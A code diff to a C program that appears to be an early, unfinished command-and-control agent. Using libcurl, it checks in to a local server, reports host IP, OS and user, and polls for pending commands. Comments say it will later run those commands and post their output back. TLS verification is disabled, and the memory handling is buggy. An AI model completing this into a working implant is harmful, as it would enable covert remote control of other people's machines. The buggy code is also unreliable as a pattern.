@@ -6,15 +6,38 @@
 //apt install libjson-c-dev
 
 // global variables
-char *first_response; 
+char *first_response;
+char *polling_response;
+char *access_token;
+char *document_id;
+char *document_ip;
+char *document_os;
+char *document_agent_id;
+char *document_rev;
+char *document_user;
+// json variables for tokens recieved from initial check in 
 struct json_object *parsed_json;
 struct json_object *token;
 struct json_object *refresh;
 struct json_object *id;
+struct json_object *agent_id;
 struct json_object *rev;
+struct json_object *completed_commands;
+struct json_object *ip;
+struct json_object *os;
+struct json_object *user;
+struct json_object *pending_commands;
+struct json_object *each_command_in_pending;
+struct json_object *each_command_in_complete;
+size_t n_pen_comm;
+size_t n_com_comm;
+
+///////
+// json variables for params recieved on each poll to database 
+
 
 // first callback function on first_Check_in post request
-char *function_pt(void *ptr, size_t size, size_t nmemb, void *stream){
+char *first_check_in_callback(void *ptr, size_t size, size_t nmemb, void *stream){
     //printf("%s",ptr);
     //call back function
     //printf("test\n");
@@ -22,6 +45,46 @@ char *function_pt(void *ptr, size_t size, size_t nmemb, void *stream){
     strncpy(first_response,ptr,nmemb);
     return first_response;
 }
+
+void poll_callback(void *ptr, size_t size, size_t nmemb, void *stream){
+    polling_response = malloc(nmemb * 10);
+    strncpy(polling_response,ptr,nmemb);
+    printf("%s\n",polling_response);
+    if (polling_response){
+    	parsed_json = NULL;
+    	rev = NULL;
+    	parsed_json = json_tokener_parse(polling_response); 
+    	// document id doesnt change so we dont need to get that value
+    	//its a global variable
+    	json_object_object_get_ex(parsed_json,"rev",&rev);
+    	json_object_object_get_ex(parsed_json,"agent_id",&agent_id);
+    	json_object_object_get_ex(parsed_json,"completed_commands",&completed_commands);
+    	json_object_object_get_ex(parsed_json,"ip",&ip);
+    	json_object_object_get_ex(parsed_json,"os",&os);
+    	json_object_object_get_ex(parsed_json,"pending_commands",&pending_commands);
+    	json_object_object_get_ex(parsed_json,"user",&user);
+    	document_agent_id = json_object_get_string(agent_id);
+    	document_rev = json_object_get_string(rev);
+    	document_os = json_object_get_string(os);
+    	document_ip = json_object_get_string(ip);
+    	document_user = json_object_get_string(user);
+    	n_pen_comm = json_object_array_length(pending_commands);
+    	// currently stuck at this point trying to validate if the array is empty or not
+
+    	//n_pen_comm = json_object_array_length(pending_commands);
+    	//n_com_comm = json_object_array_length(completed_commands);
+
+    	//printf("amount of commands in pending => %lu \n",pending_commands);
+    }
+    // ok we got the response string,
+    // parse into json
+    // check if something is in pending commands
+    // IF yes there is command, run the command and get output in string, post it to the database and get a refresh token for future requests
+    // IF NOT just do a get request to get a new refresh token that needs to be parsed and saved for future requests
+}
+
+
+
 
 void first_check_in(char *urls){
 	CURL *curl;
@@ -44,7 +107,7 @@ void first_check_in(char *urls){
 		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
 		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
 		curl_easy_setopt(curl,CURLOPT_URL,urls);
-		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, function_pt);
+		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, first_check_in_callback);
 		//curl_easy_setopt(curl, CURLOPT_WRITEDATA, jsonz);
 		res = curl_easy_perform(curl);
 		if (res != CURLE_OK)
@@ -57,50 +120,12 @@ void first_check_in(char *urls){
 
 
 // this needs to be run on a loop
-//headers = {"doc_id":self.doc_id,"Authorization":"Bearer {}".format(self.access_token)}
 // performs get request to check if commands have been added to pending commands array in json document in database
-int polling2(char *id,char *token){
-	CURL *curl;
-	CURLcode res;
-	//GET REQUEST
-	curl_global_init(CURL_GLOBAL_DEFAULT);
-	curl = curl_easy_init();
-	if (curl){
-		struct curl_slist *chunk2 = NULL;
-		char header_doc[100] = "doc_id:";
-		char header_auth[100] = "Authorization:";
-		strcat(header_doc,id);
-		strcat(header_auth,token);
-		printf("%s\n",header_auth );
-		printf("%s\n",header_doc );
-		puts("midway through curl\n");
-		//chunk2 = curl_slist_append(chunk2,"test:test");
-		//chunk2 = curl_slist_append(chunk2,"fake:fake");
-		puts("completed chunk");
-		//curl_easy_setopt(curl,CURLOPT_HTTPHEADER,chunk2);
-		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
-		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
-		char url[100] = "https://127.0.0.1:9000/poll";
-		curl_easy_setopt(curl,CURLOPT_URL,url);
-		// insert callback function here
-		//curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, function_pt);
-		res = curl_easy_perform(curl);
-		if (res != CURLE_OK)
-			fprintf(stderr, "curl_easy_perform() failed: %s\n",curl_easy_strerror(res));
-		curl_easy_cleanup(curl);
-	}
-	curl_global_cleanup();
-	return 0;
-}
-
-
 
 int polling(char *id,char *token){
 	CURL *curl;
 	CURLcode res;
 	//POST REQUEST
-	// need to create functions to run inital data commands and pass them to this data string below
-	//const char *data = "{\"agent_id\":\"123\",\"os\":\"Linux\",\"ip\":\"0.0.0.0\",\"user\":\"notroot\",\"completed_commands\":[],\"pending_commands\":[]}";
 	curl_global_init(CURL_GLOBAL_DEFAULT);
 	curl = curl_easy_init();
 	if (curl){
@@ -112,8 +137,8 @@ int polling(char *id,char *token){
 		char header_auth[300] = "Authorization:Bearer ";
 		strcat(header_doc,id);
 		strcat(header_auth,token);
-		printf("%s\n",header_auth );
-		printf("%s\n",header_doc );
+		//printf("%s\n",header_auth );
+		//printf("%s\n",header_doc );
 		chunk = curl_slist_append(chunk,header_auth);
 		chunk = curl_slist_append(chunk,header_doc);
 		//chunk = curl_slist_append(chunk,"Agent:TGVhcm5pbmdDVG9CRWxpdGUK");
@@ -122,8 +147,7 @@ int polling(char *id,char *token){
 		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
 		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
 		curl_easy_setopt(curl,CURLOPT_URL,"https://127.0.0.1:9000/poll");
-		//curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, function_pt);
-		//curl_easy_setopt(curl, CURLOPT_WRITEDATA, jsonz);
+		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, poll_callback); // calls polling callback function
 		res = curl_easy_perform(curl);
 		if (res != CURLE_OK)
 			fprintf(stderr,"curl_easy_perform() failed : %s\n",curl_easy_strerror(res));
@@ -131,21 +155,6 @@ int polling(char *id,char *token){
 	}
 	curl_global_cleanup();
 }
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 /*
@@ -171,11 +180,6 @@ int polling(char *id,char *token){
 */
 
 
-
-
-
-
-
 int main(void){
 	char *test_url = "https://localhost:9000/first_check_in";
 	char *polling_url = "https://localhost:9000/poll";
@@ -185,6 +189,7 @@ int main(void){
 	///// remember to free first response when done
 	//free(first_response);
 	parsed_json = json_tokener_parse(first_response); 
+	free(first_response);
 	// parsed json object
 	json_object_object_get_ex(parsed_json,"id",&id);
 	// getting each section of the json
@@ -195,13 +200,14 @@ int main(void){
 	//printf("%s\n",json_object_get_string(refresh));
 	//printf("%s\n",json_object_get_string(rev));
 	//printf("%s\n",json_object_get_string(token));
-	char *access_token = json_object_get_string(token);
-	char *document_id = json_object_get_string(id);
+	access_token = json_object_get_string(token);
+	document_id = json_object_get_string(id);
 	// saving document id as a string
 	// saving access token as a string
 	printf("Successfully Completed Check In\n");
-	printf("Successfully Extracted first response into variables");
+	printf("Successfully Extracted first response into variables\n");
 	polling(document_id,access_token);
+	//printf("%s\n",polling_response);
 
 
 	return 0;
